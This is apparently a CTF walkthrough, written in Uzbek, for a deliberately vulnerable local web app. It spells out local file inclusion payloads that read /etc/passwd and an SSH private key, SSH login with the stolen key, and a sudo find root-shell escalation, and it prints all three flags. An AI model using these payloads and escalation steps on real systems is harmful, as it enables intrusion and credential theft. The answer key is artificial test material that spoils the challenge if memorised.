# LFI CTF Challenge - Tezkor Yo'riqnoma

## Ishga Tushirish

```bash
cd ctf-lfi
docker-compose up -d --build
```

Sayt: `http://localhost:3080`
SSH: `port 3022`

## Challenge Yechimi (2 ta flag)

### 1-Qadam: Register qiling
```
http://localhost:3080/register
```

Username va password yarating (minimum 6 belgi). Register qilgandan keyin avtomatik dashboard ga kirasiz.

### 2-Qadam: Dashboard
```
http://localhost:3080/dashboard
```

Dashboard da "View Documentation" tugmasini bosing yoki sidebardan "Docs" ni tanlang.

### 3-Qadam: Documentation viewer ga kiring
```
http://localhost:3080/docs
```

Documentation sahifasida turli fayllarni ko'ring.

### 4-Qadam: Sample fayllarni tekshiring

Documentation viewerda bir nechta sample fayllar ko'rsatilgan:
- `/app/docs/readme.txt`
- `/app/docs/api-guide.txt`
- `/app/docs/security-policy.txt`

URL strukturasini kuzating: `/documentation/view?file=<path>`

### 5-Qadam: LFI zaifligini sinab ko'ring

**Usul 1: Absolute path**
```
http://localhost:3080/documentation/view?file=/etc/passwd
```

**Usul 2: Path traversal (../../)**
```
http://localhost:3080/documentation/view?file=../../../../../../../../../etc/passwd
```

Fayl oxirida hint topasiz:
```
# HINT: Check /etc/flag for something interesting
```

### 6-Qadam: Birinchi Flag ni o'qing

```
http://localhost:3080/documentation/view?file=/etc/flag
```

**Flag 1:**
```
FinTech{l0c4l_f1l3_1nclus10n_vuln3r4b1l1ty}
```

### 7-Qadam: SSH Private Key ni o'qish

```
http://localhost:3080/documentation/view?file=/home/ctfuser/.ssh/id_rsa
```

Yoki path traversal bilan:
```
http://localhost:3080/documentation/view?file=../../../../../../home/ctfuser/.ssh/id_rsa
```

### 8-Qadam: SSH kaliti bilan ulanish

Private keyni faylga saqlang:
```bash
# id_rsa_stolen faylini yarating va kalitni joylashtiring
nano id_rsa_stolen

# Kerakli ruxsatlarni bering
chmod 600 id_rsa_stolen

# SSH orqali ulaning
ssh -i id_rsa_stolen -p 3022 ctfuser@localhost
```

### 9-Qadam: Ikkinchi Flag ni o'qing

SSH ga ulanganingizdan keyin:
```bash
cat ~/flag_ssh.txt
```

**Flag 2:**
```
FinTech{ssh_pr1v4t3_k3y_3xp0s3d_v14_lf1}
```

### 10-Qadam: Privilege Escalation (GTFOBins)

SSH da enumeration qiling:
```bash
# Sudoers fayllarini tekshirish
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/ctfuser

# Yoki find bilan qidirish
find /etc -name sudoers.d -type d 2>/dev/null
```

Output:
```
ctfuser ALL=(ALL) NOPASSWD: /usr/bin/find
```

**GTFOBins exploit:**
```bash
# find bilan root shell olish
sudo find . -exec /bin/bash \; -quit
```

Yoki:
```bash
# find bilan root command execute qilish
sudo find . -exec whoami \; -quit
sudo find . -exec cat /root/flag_root.txt \; -quit
```

### 11-Qadam: Root Flag ni o'qing

```bash
# Root shell oldingizdan keyin
cat /root/flag_root.txt
```

**Flag 3:**
```
FinTech{pr1v1l3g3_3sc4l4t10n_m4st3r_gtf0b1ns}
```

## Barcha Flaglar

```
Flag 1: FinTech{l0c4l_f1l3_1nclus10n_vuln3r4b1l1ty}        [/etc/flag]
Flag 2: FinTech{ssh_pr1v4t3_k3y_3xp0s3d_v14_lf1}          [SSH via LFI]
Flag 3: FinTech{pr1v1l3g3_3sc4l4t10n_m4st3r_gtf0b1ns}     [Root via GTFOBins]
```

## Qo'shimcha Payloadlar

### Absolute Path usuli:
```bash
# Flaglar
http://localhost:3080/documentation/view?file=/etc/flag
http://localhost:3080/documentation/view?file=/home/ctfuser/.ssh/id_rsa

# System fayllar
http://localhost:3080/documentation/view?file=/etc/passwd
http://localhost:3080/documentation/view?file=/etc/hosts
http://localhost:3080/documentation/view?file=/etc/hostname

# Application fayllar
http://localhost:3080/documentation/view?file=/app/app.py
http://localhost:3080/documentation/view?file=/app/requirements.txt
```

### Path Traversal usuli (../../):
```bash
# Flaglar
http://localhost:3080/documentation/view?file=../../../../../../../../../etc/flag
http://localhost:3080/documentation/view?file=../../../../../../home/ctfuser/.ssh/id_rsa

# System fayllar
http://localhost:3080/documentation/view?file=../../../../../../../../../etc/passwd
http://localhost:3080/documentation/view?file=../../../../../../../../../etc/hosts

# Application fayllar (relative from /app working directory)
http://localhost:3080/documentation/view?file=app.py
http://localhost:3080/documentation/view?file=requirements.txt
```

## Dizayn Xususiyatlari

- **Rang:** Green-teal-cyan cybersecurity theme
- **Layout:** Sidebar navigation (OS injection dan farqli)
- **Effects:** Glassmorphism, parallax, animations
- **UX:** Modern va interactive

## To'xtatish

```bash
docker-compose down
```

## Portlar

- **Web Application:** 3080
- **SSH Service:** 3022
